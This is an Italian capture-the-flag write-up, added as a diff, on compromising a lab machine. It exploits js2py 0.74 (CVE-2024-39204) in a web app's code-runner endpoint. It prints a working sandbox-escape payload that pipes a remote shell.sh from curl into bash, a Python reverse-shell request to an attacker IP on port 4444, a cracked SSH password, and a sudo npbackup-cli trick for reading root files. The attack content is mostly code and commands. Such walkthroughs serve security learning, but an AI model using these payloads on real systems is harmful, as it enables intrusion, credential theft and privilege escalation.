@@ -1,0 +1,62 @@
+orte aperte: 22 e 8000.
+
+Sulla 8000 c'è una webapp Gunicorn in cui posso registrarmi, loggarmi e poi mi si apre una dashboard in cui posso eseguire (ed eventualmente salvare) codice javascript. Quindi l'idea è molto semplice: trovare un modo di fare RCE.
+Nella homepage c'è anche la possibile di scaricare un file: app.zip
+
+Lo scarico e lo analizzo. Contiene il codice dell'app. Vedo che tra le dipendenze c''è js2py che probabilmete è una libreria javascript per python. Nel file requirements.txt c'è anche la versione (0.74).
+Cerco online e vedo che questa versione è soggetta alla CVE-2024-39204 che permette proprio di fare una RCE. Trovo un PoC e lo uso all'endpoint /run_code
+
+let cmd = "curl http://10.10.14.8/shell.sh|bash;"
+let hacked, bymarve, n11
+let getattr, obj
+
+hacked = Object.getOwnPropertyNames({})
+bymarve = hacked.getattribute
+n11 = bymarve("getattribute")
+obj = n11("class").base
+getattr = obj.getattribute
+
+function findpopen(o) {
+    let result;
+    for(let i in o.subclasses()) {
+        let item = o.subclasses()[i]
+        if(item.module == "subprocess" && item.name == "Popen") {
+            return item
+        }
+        if(item.name != "type" && (result = findpopen(item))) {
+            return result
+        }
+    }
+}
+
+n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
+
+Mettendomi in ascolto, ricevo la connessione come utente app. Vado nella sua home in /app/instance e trovo il file users.db
+
+strings users.db 
+
+Ci sono gli hash MD5 di alcuni utenti tra cui marco che ha una home.
+
+SSH	marco	sweetangelbabylove
+
+marco può eseguire come sudo il binario 
+    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
+
+Per eseguire il binario è necessario passargli un file di configurazione. Per fortuna ne esiste uno di default nella home di marco.
+
+sudo /usr/local/bin/npbackup-cli -c npbackup.conf --help
+
+Vedo che posso fare il backup dei path specificati nel file di configurazione. Non posso modificare il file presente nella home perché è di proprietà di root. 
+Ne creo una copia e lo modifico aggiungendo alla sezione -path anche /root/
+
+cp npbackup.conf npbackup_root.conf #MODIFICA
+sudo /usr/local/bin/npbackup-cli -c npbackup_root.conf --backup --force
+sudo /usr/local/bin/npbackup-cli -c npbackup_root.conf --dump /root/root.txt
+
+
+
+  curl -X POST http://10.10.11.82:8000/run_code \
+  -H "Content-Type: application/json" \
+  -H "Cookie: session=eyJ1c2VyX2lkIjo4LCJ1c2VybmFtZSI6ImFsZXNzaW8ifQ.aKegQQ.e5IWUAA4m54N7R0E_Z3EV92FhQw" \
+  -d '{"code":"{{(function(){let cmd = \"python3 -c \\\"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\\\\\"10.10.16.80\\\\\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\\\\\"/bin/sh\\\\\\\",\\\\\\\"-i\\\\\\\"]);\\\"\"; let hacked = Object.getOwnPropertyNames({}); let bymarve = hacked[\"__getattribute__\"]; let n11 = bymarve(\"__getattribute__\"); let obj = n11(\"__class__\").__base__; function findpopen(o) { for(let i in o.__subclasses__()) { let item = o.__subclasses__()[i]; if(item.__module__ == \"subprocess\" && item.__name__ == \"Popen\") { return item } } } findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true); return \"python_executed\"; })()}}"}'
+{"result":"python_executed"}
